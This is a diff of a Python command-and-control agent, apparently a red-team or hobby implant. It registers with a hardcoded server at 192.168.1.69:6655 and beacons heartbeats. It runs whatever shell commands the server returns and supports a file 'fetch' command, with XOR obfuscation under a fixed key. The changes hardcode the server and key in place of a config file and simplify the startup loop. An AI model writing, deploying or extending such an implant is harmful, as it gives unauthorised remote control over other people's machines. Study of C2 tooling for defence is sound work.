@@ -1,18 +1,14 @@
-import json, subprocess, time, uuid, socket, requests, platform
-import base64
+import subprocess, time, uuid, socket, requests, platform, base64
 
-
-with open("config.json") as f:
-    cfg = json.load(f)
-
-SERVER_URL = f"http://{cfg['server_host']}:{cfg['server_port']}"
-CRYPTO_KEY = cfg.get("crypto_key", "secret")
+SERVER_HOST = "192.168.1.69"  
+SERVER_PORT = 6655            
+SERVER_URL  = f"http://{SERVER_HOST}:{SERVER_PORT}"
+CRYPTO_KEY  = "supersecret"   
 
 hostname = socket.gethostname()
 mac = uuid.getnode()
 AGENT_ID = f"Agent-{hostname}"
 os_info = platform.system()
-
 
 def xor(data: str, key=CRYPTO_KEY) -> str:
     return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
@@ -31,7 +27,6 @@ def get_local_ip():
     finally:
         s.close()
 
-
 def register_agent():
     local_ip = get_local_ip()
     try:
@@ -45,7 +40,6 @@ def register_agent():
     except Exception as e:
         print(f"[!] Failed to register agent: {e}")
 
-
 def heartbeat():
     try:
         r = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": AGENT_ID}, timeout=10)
@@ -57,7 +51,6 @@ def heartbeat():
             beacon_command(commands)
     except Exception as e:
         print(f"[!] Heartbeat failed: {e}")
-
 
 def beacon_command(commands):
     for cmd in commands:
@@ -72,7 +65,7 @@ def beacon_command(commands):
             except ValueError:
                 output = "[!] Invalid fetch command format. Use: fetch <filename> <dest_path>"
 
-        # Handle Regualar Commands
+        # Handle regular commands
         else:
             output = execute_command(command_text)
 
@@ -117,11 +110,11 @@ def execute_command(command):
     except subprocess.CalledProcessError as e:
         return e.output.decode(errors="ignore")
 
-
 if __name__ == "__main__":
-    while True:
-        register_agent() 
-        break
+    try:
+        register_agent()
+    except Exception:
+        pass
 
     while True:
         heartbeat()
